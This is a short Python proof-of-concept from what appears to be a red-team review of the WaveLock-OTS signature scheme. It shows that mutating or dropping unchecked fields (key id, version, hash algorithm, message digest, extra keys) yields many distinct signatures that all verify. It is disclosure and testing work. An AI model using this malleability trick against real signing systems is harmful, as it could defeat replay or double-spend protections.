"""
ots_signature_malleability.py — WaveLock-OTS signatures are malleable.

Finding B (WAVELOCK_OTS_REDTEAM.md).

``verify_ots`` validates the scheme string, ``params_hash``, ``psi_commitment``
(equality only), and the revealed slices. It does NOT validate several fields
that ARE carried inside the signature object:

  * ``one_time_key_id``  — unchecked, freely mutable
  * ``version``          — unchecked, freely mutable
  * ``hash_alg``         — unchecked, freely mutable
  * ``message_digest``   — may be dropped entirely (the ``in (None, ...)`` test)
  * arbitrary extra keys — ignored

So from one valid signature an attacker can mint unboundedly many distinct
byte-strings that all verify (strong unforgeability / SUF is violated). This
matters for any layer that does replay / double-spend detection by hashing the
signature object or by keying on the signature's ``one_time_key_id``: that
identifier is attacker-controlled and not bound to the public key that actually
verifies the slices.

Threat model: attacker has one valid (message, signature) pair and the public
key. No secret material.
"""

from __future__ import annotations

import copy
import json

from wavelock.crypto.wavelock_ots import (
    generate_ots_keypair,
    sign_ots,
    verify_ots,
)


def malleate() -> list[dict]:
    """Return distinct signature variants that all verify for the same message."""
    kp = generate_ots_keypair(seed=bytes(range(32)))
    pub, sec = kp["public_key"], kp["secret_key"]
    msg = "pay alice 5"
    sig = sign_ots(sec, msg)

    variants = []

    v1 = copy.deepcopy(sig)
    v1["one_time_key_id"] = "ATTACKER-CHOSEN-ID"
    variants.append(("mutated one_time_key_id", v1))

    v2 = copy.deepcopy(sig)
    v2["version"] = 0xDEAD
    v2["hash_alg"] = "MD5"
    variants.append(("mutated version + hash_alg", v2))

    v3 = copy.deepcopy(sig)
    v3.pop("message_digest", None)
    variants.append(("message_digest removed", v3))

    v4 = copy.deepcopy(sig)
    v4["injected"] = {"arbitrary": "payload"}
    variants.append(("injected extra field", v4))

    out = []
    for label, var in variants:
        ok = verify_ots(pub, msg, var)
        out.append({"label": label, "verifies": ok,
                    "bytes": json.dumps(var, sort_keys=True)})
    return out


if __name__ == "__main__":
    seen = set()
    for r in malleate():
        seen.add(r["bytes"])
        print(f"[B] {r['label']:32s} verifies={r['verifies']}")
    print(f"[B] distinct verifying byte-strings minted: {len(seen)} "
          "(all from one signature) — SUF broken.")
